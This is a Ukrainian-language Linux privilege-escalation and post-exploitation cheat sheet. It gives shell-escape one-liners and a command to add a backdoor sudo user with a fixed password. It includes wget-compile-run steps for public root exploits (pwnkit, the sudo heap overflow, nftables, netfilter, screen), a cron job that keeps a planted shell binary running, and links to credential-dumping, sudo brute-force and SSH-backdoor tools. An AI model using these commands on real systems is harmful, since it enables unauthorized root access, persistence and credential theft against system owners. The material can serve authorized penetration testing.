------------------------------------------------------
Які оболонки дають доступ до командного рядка?
------------------------------------------------------

bourne shell ( /bin/sh) і bourne again shell ( /bin/bash) 

python -c 'import pty; pty.spawn("/bin/sh")' - для створення оболонки TTY bourne з більшою кількістю команд.

Ця команда використовує python для імпорту модуля pty , а потім використовує pty.spawn функція для виконання bourne shell binary ( /bin/sh). Тепер у нас є підказка ( sh-4.2$) і доступ до більшої кількості системних команд для пересування системою, як нам заманеться.

/bin/sh -i

perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')
awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell

------------------------------------------------------
Скрипт перевірки модуля безпеки додатків Apparmor:
------------------------------------------------------

if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi

------------------------------------------------------
Скрипт для аналізу системного буфера обміну Сlipboard:
------------------------------------------------------

if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi

------------------------------------------------------
Пошук цікавих файлів і директорій:
------------------------------------------------------

wfind / - пошук директорій з правами запису для поточного користувача, починаючи з кореневої директорії.
wfind . - шукає каталоги з правом запису в поточній директорії та її підкаталогах. 
wfind /etc 
wfind /var 
wfind /usr

------------------------------------------------------
Додавання нового користувача з привілеями sudo:
------------------------------------------------------

useradd -m -G sudo -s /bin/bash newadmin
echo 'newadmin:SuperSecurePass' | chpasswd

------------------------------------------------------
Експлуатація вразливостей ядра Kernel:
------------------------------------------------------

https://github.com/lucyoa/kernel-exploits
https://gitlab.com/exploit-database/exploitdb-bin-sploits
https://github.com/bwbwbwbw/linux-exploit-binaries
https://github.com/infinite-horizon219/Unix-Privilege-Escalation-Exploits-Pack

curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' ' - отримати всі вразливі версії ядра Linux.

------------------------------------------------------
Експлуатація привілеїв root
------------------------------------------------------

Отримання root через вразливий pwnkit:

wget https://codeload.github.com/berdav/CVE-2021-4034/zip/main -O pwnkit.zip
unzip pwnkit.zip
cd CVE-2021-4034-main
gcc pwnkit.c -o pwnkit
./pwnkit

Отримання root через вразливий sudo (якщо версія 1.8.31 і нижче):

wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main -O sudo_exploit.zip
unzip sudo_exploit.zip
cd CVE-2021-3156-main
make
./sudo-hax-me-a-sandwich

Отримання root через вразливий nftables:

wget https://www.openwall.com/lists/oss-security/2022/08/29/5/1 -O nft_exploit.c
gcc nft_exploit.c -o nft_exploit
./nft_exploit

Отримання root через вразливий ip_tables:

wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c -O netfilter_exploit.c
gcc netfilter_exploit.c -o netfilter_exploit
./netfilter_exploit

Отримання root через вразливий screen:

wget https://www.exploit-db.com/download/41154 -O screen_exploit.sh
chmod +x screen_exploit.sh
./screen_exploit.sh

-------------------------------------------------
Отримання чутливих даних через дамп пам'яті
------------------------------------------------

зробити дамп і проаналізувати там чутливі дані:

ps -ef | grep "authenticator"

cat /proc/sys/kernel/yama/ptrace_scope - перевірка чи є права відлагоджувати процеси.

Питання - як зняти дамп без root?

https://github.com/huntergregal/mimipenguin
https://github.com/controlplaneio/truffleproc

----------------------------------------------
Експлуатація Cron
----------------------------------------------

Додати в Cron виконання шелу на постійній основі:

mkdir -p ~/.local/bin
cp /tmp/shell.elf ~/.local/bin/shell
chmod +x ~/.local/bin/shell
(crontab -l 2>/dev/null; echo "* * * * * pgrep hikkash || ~/.local/bin/shell") | crontab - 
(додати в планувальник щоби вічно був процес)

-------------------------------------------
Отримання sudo через GTFOBins
------------------------------------------

GTFOBins — це каталог системних утиліт (бінарників), які можна використовувати для ескалації привілеїв, обходу обмежень або ухилення від захисту. Він корисний для пентестерів та адміністраторів, щоб знаходити можливі лазівки у безпеці системи.

Пошук цікавих бінарників:

find  / -xdev -type f -perm /6000  -ls 2>/dev/null - пошук бінарників з SUID/SGID бітами (рекомендовано).
find / -perm -u=s -type f 2>/dev/null - аналогічно пошук бінарників з SUID/SGID бітами.
find / -perm -4000 2>/dev/null
find / -type f -executable 2>/dev/null
echo $PATH

Список бінарників з можливістю ескалації привілеїв можна переглянути тут: https://gtfobins.github.io
База показує як можна використати ту чи іншу вбудовану команду Linux.

-----------------------------------------
Брутфорс SUDO
----------------------------------------

https://github.com/carlospolop/su-bruteforce

./suBF.sh -u <USERNAME> [-w top12000.txt]  [-t 0.7] [-s 0.007]

------------------------------------
“unprivileged users with UID > INT_MAX can successfully execute any systemctl command”

id
systemd-run -t /bin/bash

https://x.com/paragonsec/status/1071152249529884674

Вразливість у Polkit, описана в звіті, дозволяє локальному користувачу з UID, що перевищує максимальне значення для типу int (INT_MAX), виконувати команди systemctl без необхідної автентифікації. Це відбувається через те, що Polkit неправильно обробляє UID, які виходять за межі діапазону типу int, що призводить до помилок при перевірці прав доступу.​

Для експлуатації цієї вразливості необхідно створити користувача з UID, що перевищує INT_MAX (наприклад, 4000000000), і виконати команду systemctl. У результаті Polkit не зможе правильно обробити такий UID, що дозволить обійти механізми автентифікації та виконати команду з підвищеними привілеями.​

Однак, варто зазначити, що ця вразливість була виявлена понад 6 років тому і, ймовірно, вже виправлена в сучасних версіях Polkit. 

----
Docs & Tools:

https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.html
https://github.com/AlessandroZ/BeRoot/tree/master/Linux
https://gtfobins.github.io
https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet
https://github.com/hackerschoice/ssh-key-backdoor
